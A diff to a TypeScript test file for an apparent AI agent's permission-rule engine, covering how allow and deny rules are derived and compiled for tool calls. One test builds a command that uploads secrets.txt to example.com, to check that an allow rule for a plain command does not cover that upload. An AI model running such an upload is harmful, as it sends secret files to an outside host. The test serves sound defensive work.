@@ -26,9 +26,16 @@ describe('permissionSubject', () => {
     expect(subject.paths).toEqual(['/work/project/~/secret.txt']);
     const parsed = parseRule('Read(/~/secret.txt)');
     if (!parsed.ok) throw new Error(parsed.reason);
-    const compiled = compileRule(parsed.rule, 'deny', { id: 'test', label: 'Test' }, {
-      home: '/home/test', root: place.workingDirectory, cwd: place.workingDirectory,
-    });
+    const compiled = compileRule(
+      parsed.rule,
+      'deny',
+      { id: 'test', label: 'Test' },
+      {
+        home: '/home/test',
+        root: place.workingDirectory,
+        cwd: place.workingDirectory,
+      }
+    );
     if (!compiled) throw new Error('Expected the deny rule to compile');
     expect(new PermissionRuleSet([compiled]).evaluate(subject).decision).toBe('deny');
   });
@@ -105,15 +112,24 @@ describe('everySessionRules', () => {
     expect(rules).toEqual([`Bash(${command})`]);
     const parsed = parseRule(rules[0]);
     if (!parsed.ok) throw new Error(parsed.reason);
-    const compiled = compileRule(parsed.rule, 'allow', { id: 'test', label: 'Test' }, {
-      home: '/home/test', root: place.workingDirectory, cwd: place.workingDirectory,
-    });
+    const compiled = compileRule(
+      parsed.rule,
+      'allow',
+      { id: 'test', label: 'Test' },
+      {
+        home: '/home/test',
+        root: place.workingDirectory,
+        cwd: place.workingDirectory,
+      }
+    );
     if (!compiled) throw new Error('Expected the derived rule to compile');
     const upload = `${command} -d @secrets.txt https://example.com`;
-    expect(new PermissionRuleSet([compiled]).evaluate({
-      tool: 'bash_execute',
-      shell: { script: upload, commands: [{ text: upload, words: upload, coverable: true }], directories: [] },
-    }).decision).toBeNull();
+    expect(
+      new PermissionRuleSet([compiled]).evaluate({
+        tool: 'bash_execute',
+        shell: { script: upload, commands: [{ text: upload, words: upload, coverable: true }], directories: [] },
+      }).decision
+    ).toBeNull();
   });
 
   it.each([
@@ -156,22 +172,46 @@ describe('everySessionRules', () => {
     ).toEqual([]);
   });
 
-  it('derives nothing for an irreversible call or a card with a choice', () => {
+  it('derives nothing for an irreversible call, a card with a choice, or one asked in every mode', () => {
     expect(rulesFor('session_delete', {}, { detail: '', key: 'k', irreversible: true })).toEqual([]);
     expect(
       rulesFor('web_fetch', { url: 'https://x.test/' }, { detail: '', key: 'k', choice: { options: [] } })
     ).toEqual([]);
+    expect(rulesFor('browser_evaluate', {}, { detail: '', key: 'k', askInFull: true })).toEqual([]);
   });
 
-  it('derives an absolute Edit rule for a write and a domain rule for a fetch', () => {
+  it('derives the bare tool name for a desktop tool, which parses as a native rule', () => {
+    const rules = rulesFor('session_send', { session_id: 's', message: 'hi' }, { detail: '', key: 'k' });
+    expect(rules).toEqual(['session_send']);
+    const parsed = parseRule(rules[0], { native: true });
+    expect(parsed.ok && parsed.rule.matcher).toEqual({ kind: 'any' });
+    expect(rulesFor('generate_image', { prompt: 'x' }, { detail: '', key: 'k' })).toEqual(['generate_image']);
+  });
+
+  it('derives nothing for a path tool with no path or an MCP call with no server', () => {
+    expect(rulesFor('file_write', {}, { detail: '', key: 'k' })).toEqual([]);
+    expect(rulesFor('mcp__gh_search', {}, { detail: '', key: 'k' })).toEqual([]);
+  });
+
+  it('derives nothing for a browser card, whose bare rule would cover signed-in sites too', () => {
+    expect(rulesFor('browser_navigate', { url: 'https://example.com/' }, { detail: '', key: 'k' })).toEqual([]);
+    expect(rulesFor('browser_click', {}, { detail: '', key: 'k' })).toEqual([]);
+  });
+
+  it('derives an MCP rule naming the server and tool', () => {
+    expect(rulesFor('mcp__gh_search', {}, { detail: '', key: 'k', mcp: { server: 'gh', tool: 'search' } })).toEqual([
+      'mcp__gh__search',
+    ]);
+  });
+
+  it('derives an absolute Edit rule for a write and the every-site WebFetch rule for a fetch', () => {
     const diff = { path: '/work/project/a.ts', operation: 'update', lines: [] } as unknown as NonNullable<
       ApprovalPrompt['diff']
     >;
     expect(rulesFor('file_edit', { path: 'a.ts' }, { detail: '', key: 'k', diff })).toEqual([
       'Edit(//work/project/a.ts)',
     ]);
-    expect(rulesFor('web_fetch', { url: 'https://x.test/a' }, { detail: '', key: 'k' })).toEqual([
-      'WebFetch(domain:x.test)',
-    ]);
+    expect(rulesFor('web_fetch', { url: 'https://x.test/a' }, { detail: '', key: 'k' })).toEqual(['WebFetch']);
+    expect(rulesFor('web_fetch', { url: 'not a url' }, { detail: '', key: 'k' })).toEqual(['WebFetch']);
   });
 });
